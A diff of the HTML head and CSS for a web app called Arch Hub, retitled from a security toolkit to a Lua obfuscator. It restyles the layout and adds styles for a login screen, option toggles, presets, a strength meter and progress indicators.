@@ -3,632 +3,264 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Arch Hub — Security Toolkit</title>
+<title>Arch Hub — Lua Obfuscator</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
 <style>
 :root {
-  --bg-0: #060910;
-  --bg-1: #0d1220;
-  --bg-2: #131b2e;
-  --bg-3: #1a2540;
-  --bg-4: #223050;
-  --accent: #6e56cf;
-  --accent-hi: #9b82f3;
-  --accent-lo: #3d2f7a;
-  --accent-glow: rgba(110, 86, 207, 0.25);
-  --teal: #2dd4bf;
-  --teal-lo: rgba(45, 212, 191, 0.12);
-  --warn: #f59e0b;
-  --danger: #ef4444;
-  --ok: #22c55e;
-  --text-0: #f0f4ff;
-  --text-1: #b8c4e0;
-  --text-2: #7a8aaa;
-  --text-3: #4a5878;
-  --border: rgba(110, 86, 207, 0.18);
-  --border-hi: rgba(110, 86, 207, 0.4);
-  --mono: 'JetBrains Mono', monospace;
-  --sans: 'Inter', sans-serif;
+  --bg-0:#060910;--bg-1:#0d1220;--bg-2:#131b2e;--bg-3:#1a2540;--bg-4:#223050;
+  --accent:#6e56cf;--accent-hi:#9b82f3;--accent-lo:#3d2f7a;--accent-glow:rgba(110,86,207,.25);
+  --teal:#2dd4bf;--warn:#f59e0b;--danger:#ef4444;--ok:#22c55e;
+  --text-0:#f0f4ff;--text-1:#b8c4e0;--text-2:#7a8aaa;--text-3:#4a5878;
+  --border:rgba(110,86,207,.18);--border-hi:rgba(110,86,207,.4);
+  --mono:'JetBrains Mono',monospace;--sans:'Inter',sans-serif;
 }
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;background:var(--bg-0);color:var(--text-0);font-family:var(--sans);font-size:14px;line-height:1.6;overflow:hidden}
+html,body,.shell{height:100dvh}
+::selection{background:rgba(110,86,207,.45);color:#fff}
+:focus-visible{outline:2px solid var(--accent-hi);outline-offset:2px}
+textarea:focus-visible,input:focus-visible,select:focus-visible{outline:none}
+input:-webkit-autofill,input:-webkit-autofill:hover,input:-webkit-autofill:focus{
+  -webkit-text-fill-color:var(--text-0);
+  -webkit-box-shadow:0 0 0 1000px var(--bg-0) inset;
+  caret-color:var(--text-0);transition:background-color 9999s}
 
-*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-
-html, body {
-  height: 100%;
-  background: var(--bg-0);
-  color: var(--text-0);
-  font-family: var(--sans);
-  font-size: 14px;
-  line-height: 1.6;
-  overflow: hidden;
-}
-
-/* ── LAYOUT ── */
-.shell {
-  display: grid;
-  grid-template-columns: 230px 1fr;
-  grid-template-rows: 48px 1fr;
-  height: 100vh;
-  overflow: hidden;
-}
+/* ── SHELL ── */
+.shell{display:grid;grid-template-rows:48px 1fr;height:100vh;overflow:hidden}
 
 /* ── TOPBAR ── */
-.topbar {
-  grid-column: 1 / -1;
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  padding: 0 20px;
-  background: var(--bg-1);
-  border-bottom: 1px solid var(--border);
-  z-index: 10;
-  position: relative;
+.topbar{
+  display:flex;align-items:center;gap:12px;padding:0 20px;
+  background:var(--bg-1);border-bottom:1px solid var(--border);
+  position:relative;z-index:10;
+  padding-top:env(safe-area-inset-top,0px);
+  height:calc(48px + env(safe-area-inset-top,0px));
 }
-.logo {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  font-family: var(--mono);
-  font-weight: 600;
-  font-size: 15px;
-  letter-spacing: -0.01em;
-  color: var(--text-0);
-  text-decoration: none;
-  user-select: none;
-  cursor: pointer;
+.topbar::after{
+  content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent 0%,var(--accent) 30%,var(--teal) 60%,transparent 100%);
+  background-size:200% 100%;animation:shimBar 4s linear infinite;opacity:.6;
 }
-.logo-icon { width: 24px; height: 24px; position: relative; flex-shrink: 0; }
-.logo-icon svg { width: 100%; height: 100%; }
-.logo-sep { width: 1px; height: 20px; background: var(--border-hi); margin: 0 4px; }
-.logo-sub { font-size: 11px; font-weight: 400; color: var(--text-3); letter-spacing: 0.08em; text-transform: uppercase; }
-.topbar-spacer { flex: 1; }
-.topbar-badge {
-  font-family: var(--mono);
-  font-size: 10px;
-  padding: 2px 8px;
-  border-radius: 3px;
-  background: var(--accent-lo);
-  color: var(--accent-hi);
-  border: 1px solid var(--accent-lo);
-  letter-spacing: 0.05em;
-}
-.topbar-user {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  padding-right: 12px;
-  margin-right: 4px;
-  border-right: 1px solid var(--border);
-}
-.user-avatar {
-  width: 24px; height: 24px; border-radius: 50%;
-  background: linear-gradient(135deg, var(--accent), var(--accent-hi));
-  color: #fff; display: flex; align-items: center; justify-content: center;
-  font-size: 11px; font-weight: 600; font-family: var(--mono); flex-shrink: 0;
-}
-.user-name { font-family: var(--mono); font-size: 12px; color: var(--text-1); }
-.user-role {
-  font-size: 9px; padding: 1px 6px; border-radius: 3px;
-  background: var(--accent-lo); color: var(--accent-hi);
-  font-family: var(--mono); text-transform: uppercase; letter-spacing: 0.05em; font-weight: 600;
-}
-
-/* ── SIDEBAR ── */
-.sidebar {
-  background: var(--bg-1);
-  border-right: 1px solid var(--border);
-  overflow-y: auto;
-  padding: 12px 0 20px;
-  display: flex;
-  flex-direction: column;
-  gap: 2px;
-  scrollbar-width: thin;
-  scrollbar-color: var(--bg-4) transparent;
-}
-.sidebar::-webkit-scrollbar { width: 4px; }
-.sidebar::-webkit-scrollbar-thumb { background: var(--bg-4); border-radius: 2px; }
-.nav-section {
-  padding: 16px 16px 4px;
-  font-size: 9px; font-weight: 600; letter-spacing: 0.12em;
-  text-transform: uppercase; color: var(--text-3); font-family: var(--mono);
-}
-.nav-item {
-  display: flex; align-items: center; gap: 9px;
-  padding: 7px 16px; cursor: pointer; color: var(--text-2);
-  font-size: 13px; font-weight: 400;
-  transition: color 0.12s, background 0.12s;
-  border-left: 2px solid transparent;
-  position: relative; user-select: none;
-  border-radius: 0 6px 6px 0; margin-right: 8px;
-}
-.nav-item:hover { color: var(--text-1); background: var(--bg-2); transform: translateX(2px); }
-.nav-item.active {
-  color: var(--accent-hi);
-  background: linear-gradient(90deg, rgba(110,86,207,0.2), rgba(110,86,207,0.06));
-  box-shadow: inset 3px 0 0 var(--accent);
-}
-.nav-dot {
-  width: 7px; height: 7px; border-radius: 50%; flex-shrink: 0;
-  background: var(--text-3); transition: background 0.12s;
-}
-.nav-item.active .nav-dot {
-  background: var(--accent);
-  animation: pulse-dot 2.5s ease-in-out infinite;
-}
-.nav-item:hover .nav-dot { background: var(--text-2); }
+@keyframes shimBar{0%{background-position:200% 0}100%{background-position:-200% 0}}
+.logo{display:flex;align-items:center;gap:8px;font-family:var(--mono);font-weight:600;font-size:15px;color:var(--text-0);user-select:none}
+.logo svg{width:24px;height:24px;flex-shrink:0}
+.logo-sep{width:1px;height:20px;background:var(--border-hi);margin:0 4px}
+.logo-sub{font-size:11px;font-weight:400;color:var(--text-3);letter-spacing:.08em;text-transform:uppercase}
+.topbar-spacer{flex:1}
+.topbar-badge{font-family:var(--mono);font-size:10px;padding:2px 8px;border-radius:3px;background:var(--accent-lo);color:var(--accent-hi);border:1px solid var(--accent-lo);letter-spacing:.05em}
+.topbar-user{display:flex;align-items:center;gap:8px;padding-right:12px;margin-right:4px;border-right:1px solid var(--border)}
+.user-avatar{width:24px;height:24px;border-radius:50%;background:linear-gradient(135deg,var(--accent),var(--accent-hi));color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;font-family:var(--mono);flex-shrink:0}
+.user-name{font-family:var(--mono);font-size:12px;color:var(--text-1)}
+.user-role{font-size:9px;padding:1px 6px;border-radius:3px;background:var(--accent-lo);color:var(--accent-hi);font-family:var(--mono);text-transform:uppercase;letter-spacing:.05em;font-weight:600}
 
 /* ── MAIN ── */
-.main {
-  overflow-y: auto;
-  background: var(--bg-0);
-  padding: 32px;
-  display: flex;
-  flex-direction: column;
-  gap: 24px;
-  scrollbar-width: thin;
-  scrollbar-color: var(--bg-3) transparent;
+.main{
+  overflow-y:auto;background:var(--bg-0);
+  padding:28px 32px calc(28px + env(safe-area-inset-bottom,0px));
+  display:flex;flex-direction:column;gap:20px;
+  scrollbar-width:thin;scrollbar-color:var(--bg-3) transparent;
 }
-.main::-webkit-scrollbar { width: 6px; }
-.main::-webkit-scrollbar-thumb { background: var(--bg-3); border-radius: 3px; }
+.main::-webkit-scrollbar{width:6px}
+.main::-webkit-scrollbar-thumb{background:var(--bg-3);border-radius:3px}
 
-.tool-panel { display: none; flex-direction: column; gap: 20px; animation: panelIn 0.15s ease; }
-.tool-panel.active { display: flex; }
-
-@keyframes panelIn {
-  from { opacity: 0; transform: translateY(6px); }
-  to   { opacity: 1; transform: translateY(0); }
-}
-@keyframes pulse-dot {
-  0%, 100% { box-shadow: 0 0 4px var(--accent); opacity: 1; }
-  50%       { box-shadow: 0 0 10px var(--accent), 0 0 20px var(--accent-glow); opacity: 0.7; }
+/* ── SCAN LINE ── */
+.shell::before{
+  content:'';position:fixed;inset:0;
+  background-image:repeating-linear-gradient(0deg,rgba(0,0,0,.03) 0px,rgba(0,0,0,.03) 1px,transparent 1px,transparent 2px);
+  pointer-events:none;z-index:999;
 }
 
-/* ── PANEL HEADER ── */
-.panel-header { display: flex; align-items: flex-start; gap: 14px; padding-bottom: 16px; border-bottom: 1px solid var(--border); }
-.panel-icon {
-  width: 36px; height: 36px; border-radius: 8px; background: var(--bg-3);
-  border: 1px solid var(--border); display: flex; align-items: center; justify-content: center;
-  flex-shrink: 0; color: var(--accent-hi);
+/* ── AUTH ── */
+.auth-screen{
+  position:fixed;inset:0;background:var(--bg-0);
+  display:flex;align-items:center;justify-content:center;
+  z-index:1000;padding:20px;overflow-y:auto;
+  background-image:
+    radial-gradient(circle at 15% 20%,rgba(110,86,207,.12),transparent 45%),
+    radial-gradient(circle at 85% 80%,rgba(45,212,191,.07),transparent 45%);
 }
-.panel-icon svg { width: 18px; height: 18px; }
-.panel-title { font-size: 18px; font-weight: 600; color: var(--text-0); line-height: 1.3; text-shadow: 0 0 20px rgba(110,86,207,0.3); }
-.panel-desc { font-size: 12px; color: var(--text-2); margin-top: 2px; line-height: 1.5; }
+.auth-screen.hidden{display:none}
+.auth-card{
+  width:100%;max-width:400px;
+  background:rgba(13,18,32,.75);border:1px solid var(--border);border-radius:12px;
+  padding:32px 28px 24px;
+  box-shadow:0 24px 80px rgba(0,0,0,.5),0 0 0 1px rgba(110,86,207,.08);
+  backdrop-filter:blur(20px) saturate(1.6);
+  -webkit-backdrop-filter:blur(20px) saturate(1.6);
+  animation:authIn .25s ease;
+}
+@keyframes authIn{from{opacity:0;transform:translateY(10px) scale(.99)}to{opacity:1;transform:translateY(0) scale(1)}}
+.auth-logo{display:flex;align-items:center;justify-content:center;gap:10px;font-family:var(--mono);font-size:20px;font-weight:600;color:var(--text-0);margin-bottom:6px}
+.auth-logo svg{width:28px;height:28px;flex-shrink:0}
+.auth-tagline{text-align:center;font-size:10px;color:var(--text-3);letter-spacing:.14em;text-transform:uppercase;font-family:var(--mono);margin-bottom:26px}
+.auth-tabs{display:flex;gap:4px;background:var(--bg-2);padding:4px;border-radius:8px;margin-bottom:22px;border:1px solid var(--border)}
+.auth-tab{flex:1;padding:8px;background:transparent;border:none;color:var(--text-2);font-family:var(--sans);font-size:13px;font-weight:500;cursor:pointer;border-radius:5px;transition:all .15s}
+.auth-tab:hover{color:var(--text-1)}
+.auth-tab.active{background:var(--bg-4);color:var(--text-0)}
+.form-group{display:flex;flex-direction:column;gap:6px;margin-bottom:14px}
+.form-group label{font-size:10px;font-weight:600;color:var(--text-2);font-family:var(--mono);letter-spacing:.08em;text-transform:uppercase}
+.form-group input{width:100%;padding:10px 12px;background:var(--bg-0);border:1px solid var(--border);border-radius:6px;color:var(--text-0);font-family:var(--sans);font-size:13px;outline:none;transition:border-color .15s,box-shadow .15s}
+.form-group input:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-glow)}
+.form-group input::placeholder{color:var(--text-3)}
+.auth-error{min-height:16px;font-size:11.5px;color:#f87171;font-family:var(--mono);margin-bottom:10px;line-height:1.4}
+.auth-error.ok{color:#4ade80}
+.auth-submit{width:100%;justify-content:center;padding:11px;font-size:13px;font-weight:600}
+.btn-google{background:#fff;color:#333;width:100%;justify-content:center;padding:11px;font-size:13px;font-weight:600;gap:10px}
+.btn-google:hover{background:#f1f1f1}
+.auth-note{margin-top:20px;padding-top:16px;border-top:1px solid var(--border);font-size:10px;color:var(--text-3);text-align:center;font-family:var(--mono);line-height:1.7}
+.auth-note strong{color:var(--text-2);font-weight:500}
 
-/* ── CARD ── */
-.card {
-  background: rgba(13, 18, 32, 0.6);
-  border: 1px solid var(--border);
-  border-radius: 8px;
-  overflow: hidden;
-  backdrop-filter: blur(12px) saturate(1.4);
-  -webkit-backdrop-filter: blur(12px) saturate(1.4);
-  box-shadow: 0 4px 24px rgba(0,0,0,0.3), inset 0 1px 0 rgba(255,255,255,0.04);
-  transition: border-color 0.2s, box-shadow 0.2s;
-}
-.card:hover {
-  border-color: var(--border-hi);
-  box-shadow: 0 0 0 1px var(--border-hi), 0 4px 32px rgba(110,86,207,0.15), inset 0 1px 0 rgba(255,255,255,0.05);
-}
-.card-head {
-  display: flex; align-items: center; justify-content: space-between;
-  padding: 10px 14px; border-bottom: 1px solid var(--border); background: var(--bg-2);
-}
-.card-label { font-family: var(--mono); font-size: 11px; font-weight: 500; color: var(--text-2); letter-spacing: 0.04em; text-transform: uppercase; }
-.card-actions { display: flex; gap: 6px; align-items: center; }
-.card-body { padding: 14px; }
+/* ── PANEL ── */
+.panel-header{display:flex;align-items:flex-start;gap:14px;padding-bottom:16px;border-bottom:1px solid var(--border)}
+.panel-icon{width:36px;height:36px;border-radius:8px;background:var(--bg-3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;color:var(--accent-hi)}
+.panel-icon svg{width:18px;height:18px}
+.panel-title{font-size:18px;font-weight:600;color:var(--text-0);line-height:1.3;text-shadow:0 0 20px rgba(110,86,207,.3)}
+.panel-desc{font-size:12px;color:var(--text-2);margin-top:2px;line-height:1.5}
 
-/* ── TEXTAREA / INPUT ── */
-textarea, input[type="text"], input[type="password"], input[type="number"], select {
-  width: 100%;
-  background: var(--bg-0);
-  border: 1px solid var(--border);
-  border-radius: 5px;
-  color: var(--text-0);
-  font-family: var(--mono);
-  font-size: 12.5px;
-  line-height: 1.65;
-  padding: 10px 12px;
-  resize: vertical;
-  outline: none;
-  transition: border-color 0.12s;
-  caret-color: var(--accent-hi);
-  font-feature-settings: "liga" 0, "calt" 1;
-  -webkit-font-smoothing: antialiased;
-  text-rendering: optimizeLegibility;
+/* ── CARDS ── */
+.card{background:rgba(13,18,32,.6);border:1px solid var(--border);border-radius:8px;overflow:hidden;backdrop-filter:blur(12px) saturate(1.4);-webkit-backdrop-filter:blur(12px) saturate(1.4);box-shadow:0 4px 24px rgba(0,0,0,.3),inset 0 1px 0 rgba(255,255,255,.04);transition:border-color .2s,box-shadow .2s}
+.card:hover{border-color:var(--border-hi);box-shadow:0 0 0 1px var(--border-hi),0 4px 32px rgba(110,86,207,.15),inset 0 1px 0 rgba(255,255,255,.05)}
+.card-head{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;border-bottom:1px solid var(--border);background:var(--bg-2)}
+.card-label{font-family:var(--mono);font-size:11px;font-weight:500;color:var(--text-2);letter-spacing:.04em;text-transform:uppercase}
+.card-actions{display:flex;gap:6px;align-items:center}
+.card-body{padding:14px}
+
+/* ── TEXTAREA / INPUT / SELECT ── */
+textarea,input[type="text"],input[type="number"],select{
+  width:100%;background:var(--bg-0);border:1px solid var(--border);border-radius:5px;
+  color:var(--text-0);font-family:var(--mono);font-size:12.5px;line-height:1.65;
+  padding:10px 12px;resize:vertical;outline:none;transition:border-color .12s;
+  caret-color:var(--accent-hi);-webkit-font-smoothing:antialiased;
 }
-textarea:focus, input[type="text"]:focus,
-input[type="password"]:focus, input[type="number"]:focus, select:focus {
-  border-color: var(--accent);
-  box-shadow: 0 0 0 2px var(--accent-glow), inset 0 1px 3px rgba(0,0,0,0.3);
-  caret-color: var(--accent-hi);
+textarea:focus,input[type="text"]:focus,input[type="number"]:focus,select:focus{
+  border-color:var(--accent);box-shadow:0 0 0 2px var(--accent-glow),inset 0 1px 3px rgba(0,0,0,.3)
 }
-textarea { min-height: 140px; }
-select {
-  -webkit-appearance: none; appearance: none;
-  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7' fill='none'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236e56cf' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
-  background-repeat: no-repeat; background-position: right 10px center;
-  padding-right: 30px; cursor: pointer; resize: none;
+textarea{min-height:160px}
+select{
+  -webkit-appearance:none;appearance:none;resize:none;cursor:pointer;padding-right:30px;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='7' fill='none'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236e56cf' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;background-position:right 10px center;
 }
-select:hover { border-color: var(--border-hi); background-color: var(--bg-2); }
-select option { background: var(--bg-2); }
+select option{background:var(--bg-2)}
 
 /* ── BUTTONS ── */
-.btn {
-  display: inline-flex; align-items: center; gap: 6px; padding: 7px 16px;
-  border-radius: 5px; border: none; cursor: pointer; font-family: var(--sans);
-  font-size: 12.5px; font-weight: 500; transition: all 0.12s;
-  text-decoration: none; user-select: none; white-space: nowrap;
-  position: relative; overflow: hidden;
-}
-.btn svg { width: 13px; height: 13px; flex-shrink: 0; }
-.btn::after {
-  content: ''; position: absolute; inset: 0;
-  background: rgba(255,255,255,0.08); opacity: 0; transition: opacity 0.15s;
-}
-.btn:active::after { opacity: 1; }
-.btn-primary { background: var(--accent); color: #fff; box-shadow: 0 0 12px rgba(110,86,207,0.25); }
-.btn-primary:hover { background: var(--accent-hi); box-shadow: 0 0 20px rgba(110,86,207,0.4); }
-.btn-secondary { background: var(--bg-3); color: var(--text-1); border: 1px solid var(--border); }
-.btn-secondary:hover { background: var(--bg-4); color: var(--text-0); border-color: var(--border-hi); }
-.btn-ghost { background: transparent; color: var(--text-2); border: 1px solid transparent; padding: 4px 8px; font-size: 11px; }
-.btn-ghost:hover { background: var(--bg-3); color: var(--text-1); border-color: var(--border); }
-.btn-danger { background: rgba(239,68,68,.12); color: var(--danger); border: 1px solid rgba(239,68,68,.2); }
-.btn-danger:hover { background: rgba(239,68,68,.2); }
+.btn{display:inline-flex;align-items:center;gap:6px;padding:7px 16px;border-radius:5px;border:none;cursor:pointer;font-family:var(--sans);font-size:12.5px;font-weight:500;transition:all .12s;text-decoration:none;user-select:none;white-space:nowrap;position:relative;overflow:hidden}
+.btn svg{width:13px;height:13px;flex-shrink:0}
+.btn::after{content:'';position:absolute;inset:0;background:rgba(255,255,255,.08);opacity:0;transition:opacity .15s}
+.btn:active::after{opacity:1}
+.btn-primary{background:var(--accent);color:#fff;box-shadow:0 0 12px rgba(110,86,207,.25)}
+.btn-primary:hover{background:var(--accent-hi);box-shadow:0 0 20px rgba(110,86,207,.4)}
+.btn-secondary{background:var(--bg-3);color:var(--text-1);border:1px solid var(--border)}
+.btn-secondary:hover{background:var(--bg-4);color:var(--text-0);border-color:var(--border-hi)}
+.btn-ghost{background:transparent;color:var(--text-2);border:1px solid transparent;padding:4px 8px;font-size:11px}
+.btn-ghost:hover{background:var(--bg-3);color:var(--text-1);border-color:var(--border)}
+.btn-nuke{background:linear-gradient(135deg,rgba(239,68,68,.2),rgba(110,86,207,.2));color:#f87171;border:1px solid rgba(239,68,68,.3)}
+.btn-nuke:hover{background:linear-gradient(135deg,rgba(239,68,68,.3),rgba(110,86,207,.3));color:#fff;border-color:rgba(239,68,68,.5);box-shadow:0 0 20px rgba(239,68,68,.2)}
 
-/* ── ROW / GRID ── */
-.row { display: flex; gap: 10px; flex-wrap: wrap; align-items: flex-end; }
-.row-nowrap { flex-wrap: nowrap; }
-.col { display: flex; flex-direction: column; gap: 6px; flex: 1; }
-.col-auto { flex: 0 0 auto; }
-.label { font-size: 11px; font-weight: 500; color: var(--text-2); letter-spacing: 0.03em; font-family: var(--mono); }
-
-/* ── NOTICE ── */
-.notice {
-  padding: 8px 12px; border-radius: 5px; font-size: 12px; font-family: var(--mono);
-  display: none; align-items: flex-start; gap: 8px; line-height: 1.5;
-}
-.notice.show { display: flex; animation: noticeIn 0.2s ease; }
-.notice-ok  { background: rgba(34,197,94,.08);  border: 1px solid rgba(34,197,94,.2);  color: #4ade80; }
-.notice-warn{ background: rgba(245,158,11,.08); border: 1px solid rgba(245,158,11,.2); color: #fbbf24; }
-.notice-err { background: rgba(239,68,68,.08);  border: 1px solid rgba(239,68,68,.2);  color: #f87171; }
+/* ── LAYOUT HELPERS ── */
+.row{display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end}
+.col{display:flex;flex-direction:column;gap:6px;flex:1}
+.col-auto{flex:0 0 auto}
+.label{font-size:11px;font-weight:500;color:var(--text-2);letter-spacing:.03em;font-family:var(--mono)}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:16px}
 
 /* ── OPTIONS GRID ── */
-.opts { display: grid; grid-template-columns: repeat(auto-fill, minmax(190px, 1fr)); gap: 10px; }
-.opt-item {
-  display: flex; align-items: center; gap: 8px; padding: 8px 10px;
-  background: var(--bg-2); border: 1px solid var(--border); border-radius: 5px;
-  cursor: pointer; transition: border-color 0.1s, background 0.1s; user-select: none;
-}
-.opt-item:hover { background: var(--bg-3); border-color: var(--border-hi); }
-.opt-label { font-size: 12px; color: var(--text-1); }
-.opt-cb {
-  width: 14px; height: 14px; border-radius: 3px; border: 1.5px solid var(--border-hi);
-  background: var(--bg-0); display: flex; align-items: center; justify-content: center;
-  flex-shrink: 0; transition: background 0.1s, border-color 0.1s;
-}
-.opt-item.checked .opt-cb { background: var(--accent); border-color: var(--accent); }
-.opt-item.checked .opt-cb::after {
-  content: ''; display: block; width: 8px; height: 5px;
-  border-left: 1.5px solid #fff; border-bottom: 1.5px solid #fff;
-  transform: rotate(-45deg) translateY(-1px);
-}
+.opts{display:grid;grid-template-columns:repeat(auto-fill,minmax(195px,1fr));gap:8px}
+.opt-item{display:flex;align-items:center;gap:8px;padding:8px 10px;background:var(--bg-2);border:1px solid var(--border);border-radius:5px;cursor:pointer;transition:border-color .1s,background .1s;user-select:none}
+.opt-item:hover{background:var(--bg-3);border-color:var(--border-hi)}
+.opt-item.checked{background:rgba(110,86,207,.08);border-color:rgba(110,86,207,.35)}
+.opt-label{font-size:12px;color:var(--text-1);flex:1}
+.opt-desc{font-size:10px;color:var(--text-3);font-family:var(--mono)}
+.opt-cb{width:14px;height:14px;border-radius:3px;border:1.5px solid var(--border-hi);background:var(--bg-0);display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:background .1s,border-color .1s}
+.opt-item.checked .opt-cb{background:var(--accent);border-color:var(--accent)}
+.opt-item.checked .opt-cb::after{content:'';display:block;width:8px;height:5px;border-left:1.5px solid #fff;border-bottom:1.5px solid #fff;transform:rotate(-45deg) translateY(-1px)}
+
+/* ── PRESETS ── */
+.presets{display:flex;gap:8px;flex-wrap:wrap}
+.preset-btn{padding:6px 14px;border-radius:20px;border:1px solid var(--border);background:var(--bg-2);color:var(--text-2);font-family:var(--mono);font-size:11px;cursor:pointer;transition:all .15s;user-select:none}
+.preset-btn:hover{border-color:var(--accent);color:var(--accent-hi);background:var(--bg-3)}
+.preset-btn.active{border-color:var(--accent);color:var(--accent-hi);background:rgba(110,86,207,.12)}
+
+/* ── STRENGTH METER ── */
+.strength-meter{display:flex;align-items:center;gap:10px}
+.strength-bar{flex:1;height:4px;background:var(--bg-3);border-radius:2px;overflow:hidden}
+.strength-fill{height:100%;border-radius:2px;transition:width .3s,background .3s}
+.strength-label{font-family:var(--mono);font-size:11px;color:var(--text-2);min-width:60px;text-align:right}
 
 /* ── STAT CHIPS ── */
-.stats-row { display: flex; gap: 10px; flex-wrap: wrap; }
-.stat-chip {
-  display: flex; align-items: center; gap: 6px; padding: 5px 10px;
-  background: var(--bg-2); border: 1px solid var(--border); border-radius: 20px;
-  font-family: var(--mono); font-size: 11px; color: var(--text-2);
-}
-.stat-chip span { color: var(--accent-hi); font-weight: 500; }
+.stat-chip{display:flex;align-items:center;gap:6px;padding:4px 10px;background:var(--bg-2);border:1px solid var(--border);border-radius:20px;font-family:var(--mono);font-size:11px;color:var(--text-2)}
+.stat-chip span{color:var(--accent-hi);font-weight:500}
 
-/* ── DASHBOARD ── */
-.dash-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; }
-.dash-card {
-  background: var(--bg-1); border: 1px solid var(--border); border-radius: 8px;
-  padding: 16px; cursor: pointer; transition: border-color 0.12s, background 0.12s, transform 0.12s;
-  display: flex; flex-direction: column; gap: 8px;
-  position: relative; overflow: hidden;
-}
-.dash-card::before {
-  content: ''; position: absolute; top: -60%; left: -60%;
-  width: 40%; height: 220%;
-  background: linear-gradient(105deg, transparent 40%, rgba(155,130,243,0.08) 50%, transparent 60%);
-  transform: rotate(-10deg); opacity: 0; transition: opacity 0.3s, left 0.5s;
-}
-.dash-card:hover { border-color: var(--accent); background: var(--bg-2); transform: translateY(-1px); box-shadow: 0 0 20px rgba(110,86,207,0.2), 0 2px 8px rgba(0,0,0,0.3); }
-.dash-card:hover::before { opacity: 1; left: 130%; }
-.dash-card-icon {
-  width: 32px; height: 32px; border-radius: 7px; display: flex;
-  align-items: center; justify-content: center; color: var(--accent-hi);
-  background: var(--bg-3); border: 1px solid var(--border);
-}
-.dash-card-icon svg { width: 16px; height: 16px; }
-.dash-card-name { font-size: 13px; font-weight: 500; color: var(--text-0); }
-.dash-card-cat { font-size: 10px; font-family: var(--mono); color: var(--text-3); text-transform: uppercase; letter-spacing: 0.06em; }
+/* ── NOTICE ── */
+.notice{padding:8px 12px;border-radius:5px;font-size:12px;font-family:var(--mono);display:none;align-items:flex-start;gap:8px;line-height:1.5}
+.notice.show{display:flex;animation:noticeIn .2s ease}
+.notice-ok{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#4ade80}
+.notice-warn{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);color:#fbbf24}
+.notice-err{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#f87171}
+@keyframes noticeIn{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:translateY(0)}}
+@keyframes panelIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
 
-/* ── HASH GRID ── */
-.hash-row {
-  display: grid; grid-template-columns: 60px 1fr auto; gap: 6px;
-  align-items: center; padding: 6px 4px; border-bottom: 1px solid var(--border);
-  border-radius: 4px; transition: background 0.15s;
-}
-.hash-row:last-child { border-bottom: none; }
-.hash-row:nth-child(even) { background: rgba(110,86,207,0.03); }
-.hash-row:hover { background: rgba(110,86,207,0.08); }
-.hash-name { font-family: var(--mono); font-size: 11px; color: var(--text-2); }
-.hash-val {
-  font-family: var(--mono); font-size: 11px; color: var(--teal);
-  word-break: break-all; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
-  font-feature-settings: "liga" 0, "calt" 1;
-}
+/* ── PROGRESS ── */
+.progress-wrap{display:none;align-items:center;gap:10px;padding:8px 12px;background:rgba(110,86,207,.08);border:1px solid var(--border);border-radius:5px;font-family:var(--mono);font-size:11px;color:var(--text-2)}
+.progress-wrap.show{display:flex}
+.progress-track{flex:1;height:3px;background:var(--bg-3);border-radius:2px;overflow:hidden}
+.progress-fill{height:100%;background:var(--accent);border-radius:2px;transition:width .2s}
+@keyframes spin{to{transform:rotate(360deg)}}
+.spinner{width:12px;height:12px;border:2px solid var(--bg-4);border-top-color:var(--accent);border-radius:50%;animation:spin .7s linear infinite;flex-shrink:0}
 
-/* ── FOOTER ── */
-.sidebar-footer { margin-top: auto; padding: 12px 16px 0; border-top: 1px solid var(--border); }
-.sidebar-footer-text { font-size: 10px; color: var(--text-3); font-family: var(--mono); line-height: 1.6; }
+/* ── SECTION LABEL ── */
+.section-label{font-size:11px;font-weight:600;color:var(--text-3);letter-spacing:.1em;text-transform:uppercase;font-family:var(--mono);padding-bottom:8px;border-bottom:1px solid var(--border)}
 
-/* ── ANIMATED TOPBAR LINE ── */
-.topbar::after {
-  content: ''; position: absolute; bottom: 0; left: 0; right: 0; height: 1px;
-  background: linear-gradient(90deg, transparent 0%, var(--accent) 30%, var(--teal) 60%, transparent 100%);
-  background-size: 200% 100%; animation: shimBar 4s linear infinite; opacity: 0.6;
+/* ── MOBILE ── */
+@media(max-width:700px){
+  .main{padding:16px 12px calc(16px + env(safe-area-inset-bottom,0px))}
+  .topbar{padding:0 12px;padding-top:env(safe-area-inset-top,0px);height:calc(48px + env(safe-area-inset-top,0px))}
+  .logo-sub,.logo-sep,.topbar-badge{display:none}
+  .two-col{grid-template-columns:1fr}
+  textarea,input,select{font-size:16px}
 }
-@keyframes shimBar {
-  0%   { background-position: 200% 0; }
-  100% { background-position: -200% 0; }
-}
-
